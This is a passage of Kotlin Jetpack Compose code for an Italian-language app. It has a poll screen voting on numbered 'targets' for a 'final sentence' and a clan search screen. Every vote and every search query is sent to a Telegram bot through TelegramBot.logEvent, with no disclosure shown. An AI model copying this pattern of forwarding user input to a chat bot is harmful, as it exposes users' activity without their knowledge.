        Text("SONDAGGI", color = Red, fontSize = 24.sp, fontWeight = FontWeight.ExtraBold)
        Spacer(modifier = Modifier.height(16.dp))
        LazyColumn(verticalArrangement = Arrangement.spacedBy(12.dp)) {
            items(3) { i ->
                Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0A0A)), border = BorderStroke(1.dp, Red), shape = RoundedCornerShape(8.dp)) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("TARGET #0$i", color = Red, fontWeight = FontWeight.Bold)
                        Text("Votazione attiva per la sentenza finale.", color = Color.White, fontSize = 13.sp)
                        Spacer(modifier = Modifier.height(12.dp))
                        Button(onClick = {
                            scope.launch { TelegramBot.logEvent("User ha votato per TARGET #0$i") }
                        }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Red)) {
                            Text("VOTA ORA", color = Black)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun DiscoverContent() {
    var searchQuery by remember { mutableStateOf("") }
    val scope = rememberCoroutineScope()
    Column(modifier = Modifier.fillMaxSize()) {
        SearchBar(
            inputField = {
                SearchBarDefaults.InputField(
                    query = searchQuery,
                    onQueryChange = { searchQuery = it },
                    onSearch = { 
                        scope.launch { TelegramBot.logEvent("User ha cercato: $it") }
                    },
                    expanded = false,
                    onExpandedChange = { },
                    placeholder = { Text("Cerca nel Clan...") },
                    leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) }
                )
            },
            expanded = false,
            onExpandedChange = { },
            modifier = Modifier.fillMaxWidth().padding(12.dp),
            colors = SearchBarDefaults.colors(containerColor = Color.DarkGray.copy(alpha = 0.3f))
        ) {}
        LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.fillMaxSize(), contentPadding = PaddingValues(1.dp), horizontalArrangement = Arrangement.spacedBy(1.dp), verticalArrangement = Arrangement.spacedBy(1.dp)) {
            items(18) { _ -> Box(modifier = Modifier.aspectRatio(1f).background(Color(0xFF0F0F0F))) }
        }
    }
}
